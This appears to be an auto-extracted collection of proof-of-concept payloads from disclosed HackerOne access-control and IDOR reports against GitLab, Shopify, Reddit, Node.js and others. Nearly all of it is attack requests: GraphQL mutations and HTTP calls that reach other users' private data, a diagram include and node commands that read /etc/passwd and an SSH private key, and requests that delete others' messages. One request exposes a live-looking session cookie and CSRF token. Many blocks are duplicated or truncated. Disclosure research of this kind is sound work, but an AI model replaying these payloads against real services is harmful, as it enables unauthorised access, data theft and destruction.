# IDOR / broken access control — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #1685822 RepositoryPipeline allows importing of local git repos — gitlab — $22,300 — Improper Access Control - Generic
Source: `hackerone/reports/2022/1685822.md` (https://hackerone.com/reports/1685822)

```
        def load(context, data)
          url = data['httpUrlToRepo']
          return unless url.present?

          url = url.sub("://", "://oauth2:#{context.configuration.access_token}@")
          project = context.portable

          Gitlab::UrlBlocker.validate!(url, allow_local_network: allow_local_requests?, allow_localhost: allow_local_requests?)

          project.ensure_repository
          project.repository.fetch_as_mirror(url)
        end
```

```
$ git fetch file://aw.rs/var/opt/gitlab/git-data/repositories/@hashed/b1/74/b174103b399555239923697fbe124faa61de4d441bd5c5678275eb0a5a27a562.git
fatal: '/var/opt/gitlab/git-data/repositories/@hashed/b1/74/b174103b399555239923697fbe124faa61de4d441bd5c5678275eb0a5a27a562.git' does not appear to be a git repository
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
```

```
await fetch("/import/bulk_imports.json", { method: "POST", headers: { "X-CSRF-Token": document.querySelector("[name=csrf-token]").content, "Content-Type": "application/json" }, body: `{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"vakzz","destination_slug":"some_project_z_${Math.floor(Math.random() * 10000)}"}]}` });
  
```

## #743953 Steal private objects of other projects via project import — gitlab — $20,000 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2022/743953.md` (https://hackerone.com/reports/743953)

```
    "issue_ids": [ 27422144 ],                                                 
    "issues": [],  
```

```
...
@project.assign_attributes(project_params)
...
```

```
board_ids
issue_ids
merge_request_ids
note_ids
...
```

## #767770 Private objects exposed through project import — gitlab — $20,000 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2022/767770.md` (https://hackerone.com/reports/767770)

```
# project.json
    "attributes": {
        "issue_ids": [ 29279725 ],
        "description": "Set from attributes[description]"
    },
```

```
    "attributes": {
        "issue_ids": [ 29279725 ],
        "description": "Set from attributes[description]"
    },
```

## #446585 Exfiltrate and mutate repository and project data through injected templated service — gitlab — $11,000 — Improper Access Control - Generic
Source: `hackerone/reports/2019/446585.md` (https://hackerone.com/reports/446585)

```
# ...
def create_services_from_active_templates(project)
  Service.where(template: true, active: true).each do |template|
    service = Service.build_from_template(project.id, template)
    service.save!
  end
end
# ...
```

```
{
  "id": 41858507,
  "title": "Email",
  "project_id": 9465078,
  "created_at": "2018-11-18T01:22:06.990Z",
  "updated_at": "2018-11-18T01:22:06.990Z",
  "active": true,
  "properties": {
    "send_from_committer_email": false,
    "disable_diffs": false,
    "recipients": "attacker@domain.tld"
  },
  "template": true,
  "push_events": true,
  "issues_events": true,
  "merge_requests_events": true,
  "tag_push_events": true,
  "note_events": true,
  "category": "ci",
  "default": false,
  "wiki_page_events": true,
  "pipeline_events": true,
  "confidential_issues_events": true,
  "commit_events": true,
  "job_events": true,
  "confidential_note_events": true,
  "type": "EmailsOnPushService"
}
```

```
{
  "id": 41858507,
  "title": "HipChat",
  "project_id": 9465078,
  "created_at": "2018-11-18T01:22:06.990Z",
  "updated_at": "2018-11-18T01:22:06.990Z",
  "active": true,
  "properties": {
    "token": "some_token",
    "room": "room",
    "server": "",
    "color": "red",
    "api_version": ""
  },
  "template": true,
  "push_events": true,
  "issues_events": true,
  "merge_requests_events": true,
  "tag_push_events": true,
  "note_events": true,
  "category": "common",
  "default": false,
  "wiki_page_events": true,
  "pipeline_events": true,
  "confidential_issues_events": true,
  "commit_events": true,
  "job_events": true,
  "confidential_note_events": true,
  "type": "HipchatService"
}
```

## #2967634 Exposed proxy allows to access internal reddit domains — reddit — $7,500 — Improper Access Control - Generic
Source: `hackerone/reports/2025/2967634.md` (https://hackerone.com/reports/2967634)

```
curl --insecure https://52.90.28.77:30920/reddit --header "Host: █████████"
```

## #1098793 Kroki Arbitrary File Read/Write  — gitlab — $5,600 — Improper Access Control - Generic
Source: `hackerone/reports/2021/1098793.md` (https://hackerone.com/reports/1098793)

```
module Gitlab
  # Parser/renderer for the AsciiDoc format that uses Asciidoctor and filters
  # the resulting HTML through HTML pipeline filters.
  module Asciidoc
    MAX_INCLUDE_DEPTH = 5
    MAX_INCLUDES = 32
    DEFAULT_ADOC_ATTRS = {
        'showtitle' => true,
        'sectanchors' => true,
        'idprefix' => 'user-content-',
        'idseparator' => '-',
        'env' => 'gitlab',
        'env-gitlab' => '',
        'source-highlighter' => 'gitlab-html-pipeline',
        'icons' => 'font',
        'outfilesuffix' => '.adoc',
        'max-include-depth' => MAX_INCLUDE_DEPTH,
        # This feature is disabled because it relies on File#read to read the file.
        # If we want to enable this feature we will need to provide a "GitLab compatible" implementation.
        # This attribute is typically used to share common config (skinparam...) across all PlantUML diagrams.
        # The value can be a path or a URL.
        'kroki-plantuml-include!' => '',
        # This feature is disabled because it relies on the local file system to save diagrams retrieved from the Kroki server.
        'kroki-fetch-diagram!' => ''
```

```
  def counter name, seed = nil
    return @parent_document.counter name, seed if @parent_document
    if (attr_seed = !(attr_val = @attributes[name]).nil_or_empty?) && (@counters.key? name)
      @attributes[name] = @counters[name] = Helpers.nextval attr_val
    elsif seed
      @attributes[name] = @counters[name] = seed == seed.to_i.to_s ? seed.to_i : seed
    else
      @attributes[name] = @counters[name] = Helpers.nextval attr_seed ? attr_val : 0
    end
  end
```

```
[#goals]

[plantuml, test="{counter:kroki-plantuml-include:/etc/passwd}", format="png"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- {counter:kroki-plantuml-include}
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```

## #1439026 Discoverability by phone number/email restriction bypass — x — $5,040 — Improper Access Control - Generic
Source: `hackerone/reports/2022/1439026.md` (https://hackerone.com/reports/1439026)

```
                           "subtask_id": "LoginEnterUserIdentifier"}]}
```

## #1213237 Deleting all DMs on RedditGifts.com — reddit — $5,000 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2021/1213237.md` (https://hackerone.com/reports/1213237)

```
DELETE /api/v1/messages/4423007/ HTTP/1.1
Host: www.redditgifts.com
X-CSRFTOKEN: rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj
Referer: https://www.redditgifts.com/api/
Cookie: csrftoken=rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj; sessionid=osymp6sp6bb83gyt8of7qbeurtuo2450
```

```
DELETE /api/v1/messages/4423007/ HTTP/1.1
Host: www.redditgifts.com
X-CSRFTOKEN: rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj
Referer: https://www.redditgifts.com/api/
Cookie: csrftoken=rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj; sessionid=osymp6sp6bb83gyt8of7qbeurtuo2450
'''
Change cookies/csrf token and `4423007` to your own message ID

## Supporting Material/References:
```

## #2207248 IDOR on GraphQL queries BillingDocumentDownload and BillDetails — shopify — $5,000 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2024/2207248.md` (https://hackerone.com/reports/2207248)

```
POST /api/shopify/███?operation=BillDetails&type=query HTTP/2
Host: admin.shopify.com
Cookie: ██████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: ████████
Caller-Pathname: /store/████████/access_account/invoice/███
Content-Length: 6674
Origin: https://admin.shopify.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: cyan
Te: trailers

{"operationName":"BillDetails","variables":{"id":"████","hasBillingSubscriptionsPermission":false},"query":"query BillDetails($id: ID!, $hasBillingSubscriptionsPermission: Boolean!) {\n  shop {\n    id\n    myshopifyDomain\n    countryCode\n    createdAt\n    name\n    plan {\n      name\n      __typename\n    }\n    easeMerchantFailedBillManualPaymentAttempts: experimentAssignment(\n      name: \"ease_merchant_failed_bill_manual_payment_attempts\"\n    )\n    __typename\n  }\n  billingAccount {\n    id\n    subscription @include(if: $hasBillingSubscriptionsPermission) {\n      id\n      billingPeriod\n      __typename\n    }\n    activePaymentMethod {\n      __typename\n      ... on BillingBankAccount {\n        id\n        bankName\n        lastDigits\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingCreditCard {\n        id\n        brand\n        lastDigits\n   
```

```
POST /api/shopify/██████?operation=BillingDocumentDownload&type=mutation HTTP/2
Host: admin.shopify.com
Cookie: ██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: ████
Caller-Pathname: /store/█████████/access_account/invoice/██████
Content-Length: 433
Origin: https://admin.shopify.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: cyan
Te: trailers

{"operationName":"BillingDocumentDownload","variables":{"id":"████","documentType":"CREDIT_NOTE"},"query":"mutation BillingDocumentDownload($id: ID!, $documentType: BillingDocumentType) {\n  billingDocumentDownload(id: $id, documentType: $documentType) {\n    job {\n      id\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

```
POST /api/shopify/███?operation=BillDetails&type=query HTTP/2
Host: admin.shopify.com
Cookie: ██████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: ████████
Caller-Pathname: /store/████████/access_account/invoice/███
Content-Length: 6674
Origin: https://admin.shopify.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: cyan
Te: trailers

{"operationName":"BillDetails","variables":{"id":"████","hasBillingSubscriptionsPermission":false},"query":"query BillDetails($id: ID!, $hasBillingSubscriptionsPermission: Boolean!) {\n  shop {\n    id\n    myshopifyDomain\n    countryCode\n    createdAt\n    name\n    plan {\n      name\n      __typename\n    }\n    easeMerchantFailedBillManualPaymentAttempts: experimentAssignment(\n      name: \"ease_merchant_failed_bill_manual_payment_attempts\"\n    )\n    __typename\n  }\n  billingAccount {\n    id\n    subscription @include(if: $hasBillingSubscriptionsPermission) {\n      id\n      billingPeriod\n      __typename\n    }\n    activePaymentMethod {\n      __typename\n      ... on BillingBankAccount {\n        id\n        bankName\n        lastDigits\n        compatibleCurrencies\n     
```

## #1658418 Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability — reddit — $5,000 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2022/1658418.md` (https://hackerone.com/reports/1658418)

```
POST / HTTP/2
Host: gql.reddit.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 62
X-Reddit-Compression: 1
Origin: https://www.reddit.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Authorization: Bearer ourtoken
Referer: https://www.reddit.com/
Te: trailers

{"id":"6243efcbc61d","variables":{"subredditName":"any-subreddit"}}
```

```
{"id":"6243efcbc61d","variables":{"subredditName":"any-subreddit",
"after":"code-from-endCursor"
}}
```

## #858671 Insufficient Type Check on GraphQL leading to Maintainer delete repository — gitlab — $4,000 — Improper Access Control - Generic
Source: `hackerone/reports/2020/858671.md` (https://hackerone.com/reports/858671)

```
  def resolve(id:)
        snippet = authorized_find!(id: id)

        response = ::Snippets::DestroyService.new(current_user, snippet).execute
```

```
  def find_object(id:)
        GitlabSchema.object_from_id(id)
      end

      def authorized_resource?(snippet)
        Ability.allowed?(context[:current_user], ability_for(snippet), snippet)
      end

      def ability_for(snippet)
        "#{ability_name}_#{snippet.to_ability_name}".to_sym
      end
```

```
mutation test{
  destroySnippet(input: {id: "gid://gitlab/DiffNote/116"}){
    errors
  }
}
```

## #819821 Initial mirror user can be assigned by other user even if the mirror was removed — gitlab — $3,000 — Improper Access Control - Generic
Source: `hackerone/reports/2020/819821.md` (https://hackerone.com/reports/819821)

```
  # safe_mirror_params.rb

  def valid_mirror_user?(mirror_params)
    return true unless mirror_params[:mirror_user_id].present?

    default_mirror_users.map(&:id).include?(mirror_params[:mirror_user_id].to_i)
  end

  def default_mirror_users
    # mirror is removed, but "project.mirror_user" is still presented here
    [current_user, project.mirror_user].compact.uniq 
  end
```

```
    return true unless mirror_params[:mirror_user_id].present?
```

```
    default_mirror_users.map(&:id).include?(mirror_params[:mirror_user_id].to_i)
```

## #981472 Undocumented `fileCopy` GraphQL API — shopify — $2,000 — Improper Access Control - Generic
Source: `hackerone/reports/2020/981472.md` (https://hackerone.com/reports/981472)

```
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Postman-Token: a02c5039-29f0-4280-9084-cfe12703ff60
Host: storeA.myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 485

{"query":"\r\nmutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {\r\nfile{\r\n    \r\n    path\r\n}\r\n userErrors {\r\n    field\r\n    message\r\n}\r\n    }\r\n}","variables":{
                        "absoluteKey": "s/files/1/d/0864/0471/6006/6199/files/1.jpg",
                        "key": "files/1.jpg",
                        "path": "https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"
}
}
```

```
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Postman-Token: a02c5039-29f0-4280-9084-cfe12703ff60
Host: storeA.myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 485

{"query":"\r\nmutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {\r\nfile{\r\n    \r\n    path\r\n}\r\n userErrors {\r\n    field\r\n    message\r\n}\r\n    }\r\n}","variables":{
```

```
                        "absoluteKey": "s/files/1/d/0864/0471/6006/6199/files/1.jpg",
                        "key": "files/1.jpg",
                        "path": "https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"
```

## #953083 Ability to publish a paid theme without purchasing it. — shopify — $2,000 — Improper Access Control - Generic
Source: `hackerone/reports/2020/953083.md` (https://hackerone.com/reports/953083)

```
    fetch("https://yourshop.myshopify.com/admin/online-store/admin/api/unversioned/graphql", {
      "headers": {
        "accept": "application/json",
        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "pragma": "no-cache",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-online-store-web": "1"
      },
      "referrerPolicy": "no-referrer",
      "body": "{\"operationName\":\"ThemePublishLegacy\",\"variables\":{\"id\":\"gid://shopify/OnlineStoreTheme/[THEME_ID]\"},\"query\":\"mutation     ThemePublishLegacy($id: ID!) {\\n  onlineStoreThemePublish(id: $id) {\\n    theme {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n          message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    });
    
```

```
    '''
    fetch("https://yourshop.myshopify.com/admin/online-store/admin/api/unversioned/graphql", {
      "headers": {
        "accept": "application/json",
        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "pragma": "no-cache",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-online-store-web": "1"
      },
      "referrerPolicy": "no-referrer",
      "body": "{\"operationName\":\"ThemePublishLegacy\",\"variables\":{\"id\":\"gid://shopify/OnlineStoreTheme/[THEME_ID]\"},\"query\":\"mutation     ThemePublishLegacy($id: ID!) {\\n  onlineStoreThemePublish(id: $id) {\\n    theme {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n          message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    });
    '''
```

## #927567 Ability to publish a paid theme without purchasing it. — shopify — $2,000 — Improper Access Control - Generic
Source: `hackerone/reports/2020/927567.md` (https://hackerone.com/reports/927567)

```
    fetch("https://yourshop.myshopify.com/admin/online-store/admin/api/unversioned/graphql", {
      "headers": {
        "accept": "application/json",
        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "pragma": "no-cache",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-online-store-web": "1"
      },
      "referrerPolicy": "no-referrer",
      "body": "{\"operationName\":\"ThemePublishLegacy\",\"variables\":{\"id\":\"gid://shopify/OnlineStoreTheme/[THEME_ID]\"},\"query\":\"mutation     ThemePublishLegacy($id: ID!) {\\n  onlineStoreThemePublish(id: $id) {\\n    theme {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n          message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    });
```

```
    '''
    fetch("https://yourshop.myshopify.com/admin/online-store/admin/api/unversioned/graphql", {
      "headers": {
        "accept": "application/json",
        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "pragma": "no-cache",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-online-store-web": "1"
      },
      "referrerPolicy": "no-referrer",
      "body": "{\"operationName\":\"ThemePublishLegacy\",\"variables\":{\"id\":\"gid://shopify/OnlineStoreTheme/[THEME_ID]\"},\"query\":\"mutation     ThemePublishLegacy($id: ID!) {\\n  onlineStoreThemePublish(id: $id) {\\n    theme {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n          message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    });
```

## #1555502 Collaborators and Staff members without all necessary permissions are able to create, edit and install custom apps — shopify — $1,900 — Improper Access Control - Generic
Source: `hackerone/reports/2022/1555502.md` (https://hackerone.com/reports/1555502)

```
POST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2
Host: 19kun-19.myshopify.com
Cookie: <COOKIES_STAFF_MEMBER>
X-Csrf-Token: <CSRF_STAFF_MEMBER>
Origin: https://19kun-19.myshopify.com
...

{
   "operationName":"CreateAppMutation",
   "variables":{
      "input":{
         "title":"test",
         "maintainerUserId":"gid://shopify/StaffMember/76770345016"
      }
   },
   "query":"mutation CreateAppMutation($input: ShopOwnedAppCreateInput!) {\n  shopOwnedAppCreate(input: $input) {\n    app {\n      id\n      title\n      __typename\n    }\n    userErrors {\n      field\n      message\n      code\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```

```
HTTP/2 200 OK
Date: Sat, 30 Apr 2022 20:04:03 GMT
Content-Type: application/json; charset=utf-8
...

{
   "data":{
      "shopOwnedAppCreate":null
   },
   "errors":[
      {
         "message":"Access denied for shopOwnedAppCreate field. Required access: The user must have edit permissions for custom apps.",
         "locations":[
            {
               "line":2,
               "column":3
            }
         ],
         "path":[
            "shopOwnedAppCreate"
         ],
         "extensions":{
            "code":"ACCESS_DENIED",
            "documentation":"https:\/\/shopify.dev\/api\/usage\/access-scopes",
            "requiredAccess":"The user must have edit permissions for custom apps."
         }
      }
   ],
   ...
}
```

```
POST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2
Host: <YOUR_STORE>
Cookie: <STAFF_MEMBER_COOKIE>
Content-Length: 428
Sec-Ch-Ua: "Chromium";v="93", " Not;A Brand";v="99"
X-Csrf-Token: <CSRF_TOKEN>
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Content-Type: application/json
Accept: application/json
X-Shopify-Web-Force-Proxy: 1
Sec-Ch-Ua-Platform: "Linux"
Origin: https://19kun-19.myshopify.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{
   "operationName":"CreateAppMutation",
   "variables":{
      "input":{
         "title":"Broken Access PoC",
         "maintainerUserId":"gid://shopify/StaffMember/<STAFF_MEMBER_ID>"
      }
   },
   "query":"mutation CreateAppMutation($input: ShopOwnedAppCreateInput!) {\n  shopOwnedAppCreate(input: $input) {\n    app {\n      id\n      title\n      __typename\n    }\n    userErrors {\n      field\n      message\n      code\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```

## #1010835 Low Privileged Staff Member Can Export Billing Charges — shopify — $1,900 — Improper Access Control - Generic
Source: `hackerone/reports/2020/1010835.md` (https://hackerone.com/reports/1010835)

```
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Host: [YOUR-SHOP].myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 303

{"query":"\r\n        \r\nmutation BillingChargesExport($id:ID!,$exportFormat:ExportFormat){billingChargesExport(id:$id,exportFormat:$exportFormat){message userErrors{field message __typename}__typename}}\r\n","variables":{
"id": "gid://shopify/BillingInvoice/58138130",
"exportFormat":"EXCEL_CSV"
}}
```

```
{
    "data": {
        "billingChargesExport": {
            "__typename": "BillingChargesExportPayload", 
            "message": null, 
            "userErrors": [
                {
                    "__typename": "UserError", 
                    "message": "Not found", 
                    "field": null
                }
            ]
        }
    }, 
    "extensions": {
        "cost": {
            "requestedQueryCost": 10, 
            "throttleStatus": {
                "restoreRate": 250.0, 
                "currentlyAvailable": 4990, 
                "maximumAvailable": 5000.0
            }, 
            "actualQueryCost": 10
        }
    }
}
```

```
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Host: [YOUR-SHOP].myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 303

{"query":"\r\n        \r\nmutation BillingChargesExport($id:ID!,$exportFormat:ExportFormat){billingChargesExport(id:$id,exportFormat:$exportFormat){message userErrors{field message __typename}__typename}}\r\n","variables":{
```

## #1751258 Attacker is able to create,Edit & delete notes and leak the title of a victim's private personal snippet — gitlab — $1,730 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2023/1751258.md` (https://hackerone.com/reports/1751258)

```
  def noteables_for_type(noteable_type)
    case noteable_type
    when "issue"
      IssuesFinder.new(@current_user, project_id: @project.id).execute # rubocop: disable CodeReuse/Finder
    when "merge_request"
      MergeRequestsFinder.new(@current_user, project_id: @project.id).execute # rubocop: disable CodeReuse/Finder
    when "snippet", "project_snippet"
      SnippetsFinder.new(@current_user, project: @project).execute # rubocop: disable CodeReuse/Finder
    when "personal_snippet"
      PersonalSnippet.all
    else
      raise "invalid target_type '#{noteable_type}'"
    end
  end
```

```
PUT /attacker/privateattackerproject/notes/8 HTTP/2
Host: gitlab-pentest2.example.com
<Rest of headers>

{"target_type":"issue","target_id":7,"note":{"note":"test2"}}
```

```
PUT /attacker/privateattackerproject/notes/8 HTTP/2
Host: gitlab-pentest2.example.com
<Rest of headers>

{"target_type":"personal_snippet","target_id":3,"note":{"note":"test2"}}
```

## #980511 A staff member with no permissions can edit Store Customer Email — shopify — $1,500 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2020/980511.md` (https://hackerone.com/reports/980511)

```
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Postman-Token: 082760e7-3dac-481e-8741-50cb2cc61617
Host: [YOUR-DOMAIN].myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 346

{"query":"\r\nmutation emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!){  emailSenderConfigurationUpdate(input:$input) {\r\n    emailSenderConfiguration{\r\n        id\r\n    }\r\n\r\nuserErrors {\r\n    field\r\n    message\r\n}\r\n}\r\n}","variables":{
  "input":{
      "senderEmail":"███"
  }
}}
```

```
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
accept: application/json
X-CSRF-Token: [REDACTED]
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.5
Postman-Token: 082760e7-3dac-481e-8741-50cb2cc61617
Host: [YOUR-DOMAIN].myshopify.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 346

{"query":"\r\nmutation emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!){  emailSenderConfigurationUpdate(input:$input) {\r\n    emailSenderConfiguration{\r\n        id\r\n    }\r\n\r\nuserErrors {\r\n    field\r\n    message\r\n}\r\n}\r\n}","variables":{
```

## #514897 Possible to enumerate Addresses of users using AddressId and guessing the delivery_subzone — eternal — $1,500 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2020/514897.md` (https://hackerone.com/reports/514897)

```
:method: GET
:path: /mumbai/order-food-online?delivery_subzone=10159
:authority: www.zomato.com
:scheme: https
user-agent: Mozilla/5.0 (Windows NT 6.3; rv:46.0) Gecko/20100101 Firefox/46.0
accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
accept-language: en-US,en;q=0.5
accept-encoding: gzip, deflate, br
referer: https://www.zomato.com
cookie: selectedAddressId=████████
```

## #497047 Blocked user Git access through CI/CD token — gitlab — $1,500 — Improper Access Control - Generic
Source: `hackerone/reports/2019/497047.md` (https://hackerone.com/reports/497047)

```
$ mkdir /etc/systemd/system/gitlab-runner.service.d
$ vim /etc/systemd/system/gitlab-runner.service.d/http-proxy.conf   
        #Add the following content
	[Service]
	Environment="HTTP_PROXY=http://192.168.0.9:8080/"
$ :wq
$ systemctl daemon-reload
$ systemctl restart gitlab-runner
```

```
$ su gitlab-runner
$ git config --global http.proxy http://192.168.0.9:8080
$ exit
```

```
test:   
  script:     
    - echo "helloworld" > /tmp/test
```

## #2434819 Improper handling of wildcards in --allow-fs-read and --allow-fs-write — ibb — $1,290 — Improper Access Control - Generic
Source: `hackerone/reports/2024/2434819.md` (https://hackerone.com/reports/2434819)

```
    $ node --experimental-permission \
           --allow-fs-read=/home/tniessen/.ssh/*.pub \
           -p "fs.readFileSync('/home/tniessen/.ssh/id_github').length"
    464
    
```

```
   $ node --experimental-permission \
           --allow-fs-read=/etc/passwd.* \
           -p 'fs.readFileSync("/etc/passwd")'
   <Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a 4e ... 2103 more bytes>
    
```

```
    '''
    $ node --experimental-permission \
           --allow-fs-read=/home/tniessen/.ssh/*.pub \
           -p "fs.readFileSync('/home/tniessen/.ssh/id_github').length"
    464
    '''
```

## #1410498 IDOR: leak buyer info & Publish/Hide foreign comments — judgeme — $1,250 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2022/1410498.md` (https://hackerone.com/reports/1410498)

```
POST /extensions/checkout_comments/curate_comment HTTP/1.1
Host: judge.me
Cookie: _judgeme_session=████████████████; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048; _gat_UA-28424713-2=1
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://judge.me/extensions/checkout_comments/comments?platform=shopify&shop_domain=test-hackerone-glis.myshopify.com&page=3&offset=50
X-Csrf-Token: ████==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23
Origin: https://judge.me
Te: trailers
Connection: close

comment_id=1&curated=ok
```

## #2528293 IDOR Exposes All Machine Learning Models — gitlab — $1,160 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2024/2528293.md` (https://hackerone.com/reports/2528293)

```
POST /api/graphql HTTP/2
Host: gitlab.com
